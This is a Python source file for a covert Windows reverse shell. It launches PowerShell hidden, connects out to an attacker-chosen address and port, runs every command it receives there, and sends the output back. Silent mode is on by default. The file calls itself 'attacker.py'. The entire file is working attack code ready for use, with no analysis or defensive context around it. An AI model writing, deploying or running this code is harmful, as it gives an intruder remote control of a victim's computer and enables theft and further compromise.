import subprocess
import argparse
import threading
import socket
import sys
import os


__author__ = "0xded"


silentMode = True
env = os.environ.copy()
powershell = subprocess.Popen("powershell.exe", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True, env=env)
flag = True 

def response(target: socket.socket, process: subprocess.Popen) -> None:
    if not silentMode: sys.stdout.write("Started Powershell.exe\r\n\r\n")
    global flag

    while flag:
        data = process.stdout.read(1)
        target.send(data)

        if not silentMode:
            try:
                sys.stdout.write(data.decode("UTF-8"))
                sys.stdout.flush()
            except UnicodeDecodeError:
                pass
            except Exception as e:
                if not silentMode: print(f"[!] (response) exception: {e}")

def sendcommand(process: subprocess.Popen, command):
    try:
        process.stdin.write(command + b'\n')
        process.stdin.flush()

    except:
        if not silentMode:
            print("[!] Exiting (sendcommand::error)")
        sys.exit()

def argument_parser():
    parser = argparse.ArgumentParser(description="Parser of attacker.py")
    parser.add_argument("--address", type=str, required=True)
    parser.add_argument("--port", type=int, required=True)

    return parser.parse_args()


if __name__ == "__main__":
    arguments = argument_parser()
    addr = (arguments.address, arguments.port)

    targetSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    targetSock.connect(addr)

    responseThread = threading.Thread(target=response, args=(targetSock, powershell,), daemon=True)
    responseThread.start()
    
    while True:
        try:
            data = targetSock.recv(1024)
            dataRecv = data.decode("UTF16")
            if dataRecv != "":
                if dataRecv == "stop" or dataRecv == "exit" or dataRecv == "quit":
                    flag = False
                    targetSock.close()
                    break
                
                sendcommand(powershell, data)

        except Exception as e:
            if not silentMode:
                print(f"Error: {e}")
        
        except KeyboardInterrupt:
            if not silentMode:
                print("[!] Keyboard Interrupt!")
                flag = False
                targetSock.close()
                break

        except:
            if not silentMode:
                print("Idk?")

    if not silentMode: print("[X] Goodbye!")
